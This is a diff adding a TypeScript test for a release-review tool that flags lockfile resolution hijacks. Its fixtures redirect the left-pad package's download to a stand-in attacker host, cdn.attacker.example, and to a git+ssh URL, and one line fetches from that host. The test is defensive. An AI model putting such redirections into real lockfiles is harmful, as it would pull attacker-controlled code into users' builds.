@@ -11,6 +11,7 @@ import {
   classifyUnverifiable,
   demoteUnsupportedFlag,
   buildFlags,
+  lockfileSources,
 } from "../src/metrics.ts";
 import { layoutTreemap } from "../src/html.ts";
 import type { ClaimResult, DiffFile, FileInsight, ReleaseData, RiskFlag } from "../src/types.ts";
@@ -494,4 +495,62 @@ test("a judge that could not answer is a finding, not silence", () => {
       .some((f) => f.kind === "judge-unavailable"),
     false,
   );
+});
+
+test("a resolution hijack in a lockfile is not invisible", () => {
+  // newDependencies() skips lockfiles on purpose — the names there restate
+  // the manifest's. But a hijack does not change a name: the manifest keeps
+  // asking for an ordinary package and the lockfile redirects the download.
+  const lock: DiffFile = {
+    path: "pnpm-lock.yaml", status: "modified", additions: 2, deletions: 0,
+    patch:
+      "@@ -10,6 +10,8 @@ packages:\n" +
+      "+  /left-pad@1.0.0:\n" +
+      "+    resolution: {tarball: https://cdn.attacker.example/left-pad.tgz}\n",
+  };
+  assert.deepEqual(newDependencies(lock, "victim/app"), [], "still not a name change");
+  assert.deepEqual(lockfileSources(lock), ["https://cdn.attacker.example/left-pad.tgz"]);
+
+  // Ordinary registry churn and Cargo's own index stay quiet.
+  assert.deepEqual(
+    lockfileSources({
+      path: "package-lock.json", status: "modified", additions: 1, deletions: 0,
+      patch: '@@ -1,2 +1,3 @@\n+      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz",\n',
+    }),
+    [],
+  );
+  assert.deepEqual(
+    lockfileSources({
+      path: "Cargo.lock", status: "modified", additions: 1, deletions: 0,
+      patch: '@@ -1,2 +1,3 @@\n+source = "registry+https://github.com/rust-lang/crates.io-index"\n',
+    }),
+    [],
+  );
+  // git/ssh/file references are never a registry release.
+  assert.deepEqual(
+    lockfileSources({
+      path: "package-lock.json", status: "modified", additions: 1, deletions: 0,
+      patch: '@@ -1,2 +1,3 @@\n+      "resolved": "git+ssh://git@github.com/evil/pkg.git#abc",\n',
+    }),
+    ["git+ssh://git@github.com/evil/pkg.git#abc"],
+  );
+  // A URL in ordinary source code is not this check's business.
+  assert.deepEqual(
+    lockfileSources({
+      path: "src/app.js", status: "modified", additions: 1, deletions: 0,
+      patch: '@@ -1,2 +1,3 @@\n+fetch("https://cdn.attacker.example/x")\n',
+    }),
+    [],
+  );
+
+  const flags = buildFlags(
+    { ...releaseData([]), files: [lock] },
+    [],
+    null,
+    [{ path: "pnpm-lock.yaml", churn: 2, sensitive: "dependencies", coverage: "undocumented" }],
+    1,
+  );
+  const flag = flags.find((f) => f.kind === "lockfile-source");
+  assert.ok(flag, `expected a lockfile-source flag, got ${flags.map((f) => f.kind).join(",")}`);
+  assert.equal(flag!.severity, "critical", "undocumented is critical, as for a new dependency");
 });
